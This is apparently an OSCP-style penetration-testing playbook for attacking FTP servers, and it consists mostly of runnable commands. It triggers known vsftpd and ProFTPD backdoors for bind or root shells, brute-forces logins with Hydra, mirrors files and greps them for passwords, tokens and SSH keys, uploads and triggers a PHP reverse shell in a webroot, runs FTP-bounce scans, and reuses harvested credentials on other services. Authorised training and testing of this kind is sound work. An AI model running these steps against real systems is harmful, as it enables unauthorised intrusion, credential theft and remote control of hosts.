
## Step 1 — NSE pre-flight

Single command — runs all relevant non-brute FTP NSE scripts. Replace `<port>` with the port from `services_<ip>.txt` (default 21).

```bash
sudo nmap -sV -v -p <port> --script "ftp-anon,ftp-bounce,ftp-syst,ftp-libopie,ftp-vsftpd-backdoor,ftp-proftpd-backdoor,ftp-vuln-cve2010-4221" <ip> -oA ftp_nse_<ip>
```

### Output checks

| #   | Check                   | Look for in output                      | Action                              |
| --- | ----------------------- | --------------------------------------- | ----------------------------------- |
| 1   | vsftpd 2.3.4 backdoor   | `ftp-vsftpd-backdoor: VULNERABLE`       | → Step 2                            |
| 2   | ProFTPD 1.3.3c backdoor | `ftp-proftpd-backdoor: VULNERABLE`      | → Step 2                            |
| 3   | CVE-2010-4221 (ProFTPD) | `ftp-vuln-cve2010-4221: VULNERABLE`     | → Step 2                            |
| 4   | OPIE off-by-one         | `ftp-libopie: VULNERABLE`               | → Step 2                            |
| 5   | Bounce attack possible  | `ftp-bounce: bounce working!`           | Note for Step 6, continue to Step 3 |
| 6   | Anonymous allowed       | `ftp-anon: Anonymous FTP login allowed` | Note for Step 3, continue           |
| 7   | None of the above       | —                                       | → Step 3                            |

Log relevant findings to `ROUTES_TRIED` in `route_<ip>.txt`.

## Step 2 — Exploit known CVE

Trigger: Step 1 fired row 1, 2, 3, or 4. Walk the matching subsection. After exploit attempt (success or fail), continue to Step 3.

### vsftpd 2.3.4 backdoor (Step 1 row 1)

Trigger: connect to FTP, send any username ending in `:)`, get bind shell on TCP 6200.

```bash
# Trigger the backdoor — username with smiley triggers, password ignored
nc <ip> <port>
USER backdoor:)
PASS anything
```

In a second terminal:

```bash
# Connect to bind shell on port 6200
nc <ip> 6200
```

Foothold confirmed → exit FTP workflow → Decision.

### ProFTPD 1.3.3c backdoor (Step 1 row 2)

Trigger: connect, send `HELP ACIDBITCHEZ`, get root shell on the FTP socket.

```bash
nc <ip> <port>
HELP ACIDBITCHEZ
```

Foothold confirmed → exit FTP workflow → Decision.

### CVE-2010-4221 — ProFTPD Telnet IAC overflow (Step 1 row 3)

Pre-auth RCE via crafted Telnet IAC sequence. Use Metasploit only if budget allows; otherwise searchsploit for standalone PoC.

```bash
# Search for standalone PoC
searchsploit ProFTPD 1.3.3
```

Read PoC source before running. Modify `<RHOST>`, `<LHOST>`, `<LPORT>` as needed.

⚠️ OSCP+ exam: counts toward Metasploit budget if using `exploit/unix/ftp/proftpd_telnet_iac`. Standalone PoC does not.

### CVE-2010-1938 — OPIE off-by-one (Step 1 row 4)

Pre-auth stack overflow in OPIE-enabled FTPd (FreeBSD/NetBSD). Rare in practice.

```bash
searchsploit opie
```

Read PoC source before running.

### Step 2 decision

Exploit succeeded → Decision (foothold).
Exploit failed or no PoC available → Step 3.

## Step 3 — Anonymous login re-check

```bash
# Connect, attempt anonymous login
ftp ftp://anonymous:anonymous@<ip>:<port>
```

Login banner shows `230 Login successful` → anonymous accepted → Step 4.
Login banner shows `530 Login incorrect` or similar → anonymous rejected → Step 5.

⚠️ Some servers accept any password with username `anonymous`. Some require username `ftp`. If `anonymous:anonymous` rejected, try `ftp:ftp` and blank password before concluding rejection:

```bash
ftp ftp://ftp:ftp@<ip>:<port>
```

```bash
ftp ftp://anonymous:@<ip>:<port>
```

### Step 3 decision

- Any of the three accepted → Step 5 (skip Step 4 — already authenticated) 
- All three rejected → Step 4


## Step 4 — Brute force

### Step 4.1 — Build username list

Build `ftp_users.txt` in nano, in priority order. Top of file = tried first.

```bash
nano ftp_users.txt
```

Paste this template, fill in tiers 1–2 from engagement context, delete any tier you have no entries for:

```
# Tier 1 — engagement-context (OSINT, social eng, client-provided)


# Tier 2 — names from other services on this host (HTTP, SMB, SNMP)


# Tier 3 — service-specific defaults
vsftpd
proftpd
pureftpd

# Tier 4 — generic defaults
admin
administrator
root
user
ftp
guest
```

⚠️ Delete the `# Tier...` comment lines before saving — Hydra will treat them as usernames otherwise.

### Step 4.2 — Hydra brute force

Walk password tiers in order.

```bash
# Password Tier 1 — FTP-specific default user:password pairs (combo file, runs in seconds, ignores ftp_users.txt)
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -s <port> <ip> ftp
```

```bash
# Password Tier 2 — full ftp_users.txt × top 1000 passwords (runs in minutes)
hydra -L ftp_users.txt -P /usr/share/seclists/Passwords/Common-Credentials/Pwdb_top-1000.txt -s <port> <ip> ftp
```

⚠️ **Before running Password Tier 3 or Tier 4** — strip user list Tier 3 (`vsftpd`, `proftpd`, `pureftpd`) and Tier 4 (`admin`, `administrator`, `root`, `user`, `ftp`, `guest`) lines from `ftp_users.txt`. Big wordlists × generic defaults = hours-to-days for ~0% hit probability.

```bash
nano ftp_users.txt
# Delete user list Tier 3 and Tier 4 lines. Save.
```

```bash
# Verify only engagement-context names remain
cat ftp_users.txt
```

```bash
# Password Tier 3 — top 10000 passwords (engagement-context users only)
hydra -L ftp_users.txt -P /usr/share/seclists/Passwords/Common-Credentials/Pwdb_top-10000.txt -s <port> <ip> ftp
```

```bash
# Password Tier 4 — rockyou, last resort (hours-to-days, engagement-context users only)
hydra -L ftp_users.txt -P /usr/share/wordlists/rockyou.txt -s <port> <ip> ftp
```

### Step 4.3 — If Hydra hangs

Add `-d` to surface connection issues:

```bash
hydra -L ftp_users.txt -P <wordlist> -s <port> -d <ip> ftp
```

Common causes:
- Port closed / wrong port → verify against `services_<ip>.txt`
- Server lockout / fail2ban kicked in → wait, retry with `-t 1` (single thread, slow)
- Wrong service string → confirm `ftp` not `ftps` (TLS-wrapped uses different module)

### Step 4.4 — TLS-wrapped FTP

If Step 1 banner shows `AUTH TLS` or port is 990:

```bash
# FTPS brute force (substitute ftp → ftps)
hydra -L ftp_users.txt -P <wordlist> -s <port> -f <ip> ftps
```

### Step 4 decision

- Valid creds found → Step 5
- All tiers exhausted, no creds → Step 6

## Step 5 — Post-auth enumeration

Entry: any successful login (Step 3 anonymous accepted, or Step 4 brute-forced creds).

⚠️ Walk every valid credential pair separately. Different accounts often have different filesystem permissions — account A may see nothing useful, account B may have access to webroot, sensitive files, or a writable directory.

For each pair `<user>:<pass>`, complete Steps 5.1–5.4 before moving to the next pair.

### Step 5.1 — Connect

```bash
ftp <ip> <port>
```

At prompts: enter `<user>`, then `<pass>`. Confirm `230 Login successful`.

### Step 5.2 — Recursive listing

At the `ftp>` prompt:

```
ls -laR
```

Maps the full visible tree. Note:
- Hidden files (`.bash_history`, `.ssh/`, `.env`, dotfiles)
- Writable directories (`drwxrwxrwx` or write bit for your user/group)
- Unusual filenames (creds, backup, dump, sql, txt, conf)
- Webroot indicators (`html/`, `www/`, `public_html/`, `htdocs/`)
- Other users' home directories visible

### Step 5.3 — Pull everything readable

Exit the FTP session first by typing `exit` at the `ftp>` prompt. Then mirror the full tree from bash (recursive):

```bash
# Recursive mirror — pulls full visible tree
wget -r -nH -P ftp_loot_<user>/ --user=<user> --password=<pass> ftp://<ip>:<port>/
```

Files land in `ftp_loot_<user>/` directory. Grep for creds and sensitive strings:

```bash
# Common credential indicators
grep -riE "password|passwd|pwd|secret|api[_-]?key|token|private[_-]?key" ftp_loot_<user>/
```

```bash
# SSH keys
find ftp_loot_<user>/ -name "id_*" -o -name "*.pem" -o -name "authorized_keys"
```

```bash
# Database dumps and configs
find ftp_loot_<user>/ -iname "*.sql" -o -iname "*.conf" -o -iname "*.cfg" -o -iname "*.env"
```

```bash 
# CTF / exam flag files 
find ftp_loot_<user>/ -iname "*flag*" -o -iname "user.txt" -o -iname "root.txt" -o -iname "proof.txt" 
```

```bash 
# Anything that isn't default Ubuntu/Debian skeleton — non-default files in home are signal 
find ftp_loot_<user>/ -type f \! -name ".bashrc" \! -name ".bash_logout" \! -name ".profile" \! -name ".viminfo" \! -name ".sudo_as_admin_successful" \! -path "*/.cache/*" 
```
### Step 5.4 — Writable directory check

Re-connect to FTP with `ftp <ip> <port>` and log in with the same `<user>:<pass>`. Test write to current directory:

```
put /etc/hostname test_write.txt
```

- `226 Transfer complete` → directory writable. Note the path. Continue Step 5.5.
- `550 Permission denied` → not writable. Skip to next account or Step 5 decision.

Clean up:

```
delete test_write.txt
```

Repeat in each `cd`'d directory of interest — different paths often have different write permissions for the same user.

### Step 5.5 — Webroot upload chain

Trigger: writable directory found AND target also runs HTTP/HTTPS (check `services_<ip>.txt`).

Common FTP-served webroot paths (`cd` then `pwd` to confirm overlap):
- `/var/www/html/`
- `/var/www/`
- `/srv/www/`
- `/srv/ftp/`
- `/home/<user>/public_html/`

If FTP path overlaps webroot, upload a webshell. Pick reverse shell flavour matching target OS (check `os_<ip>.txt`):

```bash
# Edit before upload — set <LHOST> to your IP and <LPORT> to your listener port
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
nano /tmp/shell.php
```

Start listener:

```bash
nc -lvnp <LPORT>
```

Upload via FTP:

```
ftp> put /tmp/shell.php shell.php
```

Trigger via HTTP:

```bash
curl http://<ip>/shell.php
```

Catch the reverse shell on the listener.

### Step 5 decision

After walking all valid credential pairs:

- Reverse shell caught → exit FTP workflow → Decision (foothold)
- Sensitive files / SSH keys / hashed creds found → exit FTP workflow → Decision (lateral material — feeds other workflows)
- Writable directory but no webroot overlap, no HTTP service → Step 6
- Nothing useful from any account → Step 6

## Step 6 — FTP-bounce relay

Trigger: Step 1 row 5 fired (`ftp-bounce: bounce working!`) AND no foothold from Steps 2–5.

Concept: vulnerable FTP servers honour the `PORT` command for arbitrary IP:port targets. The FTP server connects out to a target you specify, your scan/probe traffic appears to come from the FTP server's IP — useful for reaching internal hosts that trust the FTP server but not your IP.

⚠️ Modern FTP servers (vsftpd 2.0+, ProFTPD 1.3+, IIS 6+) reject bounce by default. Genuine bounce-vulnerable servers in 2026 are legacy/embedded.

### Step 6.1 — Confirm bounce works

Re-run the NSE script alone for clean output:

```bash
sudo nmap -p <port> --script ftp-bounce <ip>
```

Output `bounce working!` → continue.
Output `bounce not working` → bounce dead-end. Skip to Step 6 decision.

### Step 6.2 — What to bounce-scan

Bounce gives you reach into networks the FTP server can see but you can't. Two scenarios:

**Scenario A — internal network behind the FTP server.** FTP server has a second NIC into a private subnet. Bounce-scan the subnet from the FTP server's perspective.

**Scenario B — reaching restricted services on hosts that trust the FTP server's IP.** Target host has firewall rules allowing FTP server's IP through to specific ports. Bounce makes your scan look like it's from the FTP server.

If you don't know either applies, bounce isn't going to give you new information — skip to Step 6 decision.

### Step 6.3 — Bounce scan via nmap

`-b` flag, syntax: `username:password@server:port` (port defaults to 21 — set explicitly for non-standard).

```bash
# Bounce-scan a target IP through the vulnerable FTP server, using anonymous
sudo nmap -Pn -b anonymous:anonymous@<ftp_ip>:<ftp_port> -p <target_ports> <bounce_target_ip>
```

```bash
# Bounce-scan with valid credentials (from Step 4)
sudo nmap -Pn -b <user>:<pass>@<ftp_ip>:<ftp_port> -p <target_ports> <bounce_target_ip>
```

⚠️ `-Pn` mandatory — bounce can't carry ICMP host discovery, only TCP probes.

⚠️ Bounce scans are slow — FTP server processes one PORT command per probe. Use `--top-ports 100` or specific ports rather than `-p-`.

### Step 6.4 — Interpreting bounce results

- `open` ports surfaced via bounce → reach confirmed. Note for follow-up: feed `<bounce_target_ip>` into Master Workflow Step 4 as a new host (using FTP server as pivot).
- All `closed` / `filtered` → either nothing's there, or FTP server's network position doesn't reach the target. Bounce dead-end.

### Step 6 decision

- New reachable hosts/services found → log to `ROUTES_TRIED`, treat each as a new target through Master Workflow (Step 4 onwards), but understand all subsequent scanning of that host must continue via bounce. Note this constraint clearly.
- Bounce returned nothing useful → exit FTP workflow → Decision (no foothold via FTP)

## Decision

Walk in order, stop at first match.

| Outcome from Steps 1–6                                        | Action                                                                                              |
| ------------------------------------------------------------- | --------------------------------------------------------------------------------------------------- |
| Reverse shell caught (Step 2 backdoor, Step 5 webroot upload) | Foothold → exit FTP workflow → [[Step 6. Vulnerability Analysis]] Step 3 (PrivEsc)                  |
| Sensitive files / SSH keys / hashed creds harvested (Step 5)  | Lateral material → log to `ROUTES_TRIED`, return to Pass 3 → next service in priority               |
| Valid creds found but post-auth enum yielded nothing (Step 5) | Log creds to `ROUTES_TRIED` (may unlock other services) → return to Pass 3                          |
| Bounce relay surfaced new reachable hosts (Step 6)            | Log to `ROUTES_TRIED` → feed new host into Master Workflow Step 4 (bounce-pivot constraint applies) |
| All steps exhausted, nothing useful                           | Log `[<port>/ftp] Step 1–6 exhausted, no foothold` → return to Pass 3 → next service                |

⚠️ Credentials harvested via FTP often work elsewhere — try the same `<user>:<pass>` against SSH, SMB, web logins, databases on this and adjacent hosts before discarding.